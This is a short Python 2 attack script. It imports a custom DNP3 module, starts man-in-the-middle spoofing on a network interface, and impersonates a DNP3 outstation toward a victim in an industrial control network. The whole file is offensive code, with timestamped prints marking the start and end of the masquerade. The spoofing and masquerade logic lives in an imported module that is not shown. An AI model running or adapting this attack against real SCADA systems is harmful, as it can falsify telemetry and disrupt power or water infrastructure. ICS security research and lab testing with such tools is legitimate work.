__author__ = 'root'
from DNP3_Slave import *

mitm = DNP3_MITM_conf(interface='eth0')
mitm.init_spoofing()
victim = mitm.victim

print datetime.datetime.utcnow(), "Slave masquerading"
slave = Slave(victim, dnp3_port)
DNP = slave.start()

print datetime.datetime.utcnow(), "Slave masquerading END"